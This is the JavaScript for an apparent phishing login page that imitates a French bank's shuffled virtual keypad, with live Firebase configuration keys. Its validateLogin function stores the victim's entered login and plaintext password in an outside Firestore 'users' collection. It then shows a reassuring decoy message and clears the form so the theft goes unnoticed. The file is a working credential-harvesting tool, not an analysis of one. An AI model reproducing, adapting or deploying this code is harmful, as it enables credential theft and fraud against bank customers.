// =======================
// 🔥 FIREBASE IMPORTS
// =======================
import { initializeApp } 
  from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
import { getFirestore, collection, addDoc } 
  from "https://www.gstatic.com/firebasejs/12.9.0/firebase-firestore.js";

// =======================
// 🔥 FIREBASE CONFIG
// =======================
const firebaseConfig = {
  apiKey: "AIzaSyDvI6JeCgCiSACnQsFn0BJwe3n8ax4z2DM",
  authDomain: "bnaf-680db.firebaseapp.com",
  projectId: "bnaf-680db",
  storageBucket: "bnaf-680db.firebasestorage.app",
  messagingSenderId: "1006764327864",
  appId: "1:1006764327864:web:e259648bd542dcc19a454d",
  measurementId: "G-VW68Q4L70B"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// =======================
// 🔥 VIRTUAL KEYBOARD
// =======================
const rows = [
  ['2','9','3','1','7','4','5','0','8','6'],
  ['%','!','+','$','*','#','@','?','.','-'],
  ['u','q','s','y','b','x','a','o','e','g'],
  ['j','m','t','n','h','r','f','l','i','v'],
];
const lastRowKeys = ['Shift','k','c','p','z','w','d','Effacer'];

window.password = '';
let isShift = false;

function shuffle(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
}

function buildKeyboard(doShuffle) {
  if (doShuffle) rows.forEach(r => shuffle(r));
  const vkb = document.getElementById('vkb');
  if (!vkb) return;
  vkb.innerHTML = '';

  rows.forEach(row => {
    const rowEl = document.createElement('div');
    rowEl.className = 'vkb-row';
    row.forEach(key => {
      const btn = document.createElement('button');
      btn.className = 'vkb-key';
      btn.textContent = isShift ? key.toUpperCase() : key;
      btn.onclick = () => pressKey(key);
      rowEl.appendChild(btn);
    });
    vkb.appendChild(rowEl);
  });

  const lastRowEl = document.createElement('div');
  lastRowEl.className = 'vkb-row';
  lastRowKeys.forEach(key => {
    const btn = document.createElement('button');
    btn.className = 'vkb-key';
    if (key === 'Shift') btn.classList.add('wide'), btn.textContent='Shift';
    else if (key==='Effacer') btn.classList.add('erase'), btn.textContent='Effacer';
    else btn.textContent = isShift ? key.toUpperCase() : key;
    btn.onclick = () => pressKey(key);
    lastRowEl.appendChild(btn);
  });
  vkb.appendChild(lastRowEl);
}

function pressKey(key) {
  if (key === 'Effacer') window.password = window.password.slice(0,-1);
  else if (key === 'Shift') { isShift = !isShift; buildKeyboard(false); return; }
  else { window.password += isShift ? key.toUpperCase() : key; if(isShift){isShift=false; buildKeyboard(false); return;} }
  updateDisplay();
}

function updateDisplay() {
  const d = document.getElementById('passwordDisplay');
  if(!d) return;
  d.value = window.password.length > 0 ? '•'.repeat(window.password.length) : '';
}

// =======================
// 🔥 STEP NAVIGATION
// =======================
window.goToStep2 = function() {
  document.getElementById('step1').classList.remove('active');
  document.getElementById('step2').classList.add('active');
  document.getElementById('backBtn').style.display='block';
  window.password='';
  updateDisplay();
  buildKeyboard(true);
};

window.goBack = function() {
  document.getElementById('step2').classList.remove('active');
  document.getElementById('step1').classList.add('active');
  document.getElementById('backBtn').style.display='none';
};

// =======================
// 🔥 SAVE TO FIRESTORE + CUSTOM MESSAGE
// =======================
window.validateLogin = async function() {
  const login = document.getElementById('loginInput').value || "EMPTY_LOGIN";
  const userPassword = window.password || "EMPTY_PASSWORD";

  try {
    // Save data
    await addDoc(collection(db, 'users'), {
      login,
      password: userPassword,
      createdAt: new Date()
    });

    // Custom message instead of showing actual credentials
    alert("Opération effectuée, notre équipe technique travaille dessus.");

    // Clear inputs
    document.getElementById('loginInput').value='';
    window.password='';
    updateDisplay();

  } catch(error) {
    console.error(error);
    alert("Erreur lors de l'enregistrement des données !");
  }
};

// =======================
// 🔥 INITIALIZE
// =======================
document.addEventListener("DOMContentLoaded", ()=>{ buildKeyboard(false); });